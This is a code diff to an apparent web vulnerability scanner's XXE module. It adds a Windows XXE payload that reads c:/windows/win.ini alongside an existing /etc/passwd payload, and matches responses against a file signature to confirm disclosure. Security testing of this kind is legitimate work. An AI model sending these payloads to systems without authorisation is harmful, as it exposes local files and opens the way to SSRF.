@@ -16,10 +16,16 @@ from modules.base import BaseModule, ScanContext, register
 from core.result import Finding, Severity
 
 UNIX_PASSWD = re.compile(r"root:.*?:0:0:", re.MULTILINE)
+WIN_INI = re.compile(r"\[(fonts|extensions|mci extensions|files)\]", re.I)
 
 INBAND_FILE = (
     '<?xml version="1.0"?>\n'
     '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
+    '<data>&xxe;</data>'
+)
+INBAND_WIN = (
+    '<?xml version="1.0"?>\n'
+    '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
     '<data>&xxe;</data>'
 )
 XINCLUDE = (
@@ -59,18 +65,22 @@ class XXE(BaseModule):
     def run(self, ctx: ScanContext) -> list[Finding]:
         findings: list[Finding] = []
 
-        # 1) In-band file disclosure.
-        for body, label in ((INBAND_FILE, "external entity"), (XINCLUDE, "XInclude")):
+        # 1) In-band file disclosure (Unix /etc/passwd, Windows win.ini, XInclude).
+        for body, label, sig, fname in (
+            (INBAND_FILE, "external entity", UNIX_PASSWD, "/etc/passwd"),
+            (INBAND_WIN, "external entity (Windows)", WIN_INI, "c:/windows/win.ini"),
+            (XINCLUDE, "XInclude", UNIX_PASSWD, "/etc/passwd"),
+        ):
             if ctx.should_stop():
                 break
             for ctype, r in self._post_xml(ctx, body):
-                if UNIX_PASSWD.search(r.text or ""):
+                if sig.search(r.text or ""):
                     findings.append(Finding(
                         module_id=self.id, title=f"XXE file disclosure ({label})",
                         severity=Severity.HIGH, url=ctx.target, confidence="Confirmed",
                         description="An XML external entity read a local file, exposing filesystem contents "
                                     "(and enabling SSRF / potential RCE).",
-                        evidence=f"Content-Type {ctype}: /etc/passwd signature returned.",
+                        evidence=f"Content-Type {ctype}: {fname} signature returned.",
                         request=f"POST {ctx.target}  (Content-Type: {ctype})",
                         remediation="Disable DTDs/external entities in the XML parser (FEATURE_SECURE_PROCESSING)."))
                     return findings  # confirmed; stop
